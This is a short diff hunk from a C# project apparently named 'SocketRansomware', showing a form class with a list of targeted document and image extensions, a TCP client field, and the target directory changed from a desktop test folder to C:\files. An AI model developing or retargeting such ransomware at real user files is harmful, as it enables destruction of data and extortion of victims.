@@ -18,7 +18,7 @@ namespace SocketRansomware
     public partial class Form1 : Form
     {
         readonly string[] extensions = { ".docx", ".hwp", ".jpg", ".png", ".txt", ".jpeg" };
-        private const string PATH = @"C:\Users\whs27\Desktop\test";
+        private const string PATH = @"C:\files";
         TcpClient client;
         Thread receiveMessageThread = null;
         //서버시간과 클라이언트 시간의 차이
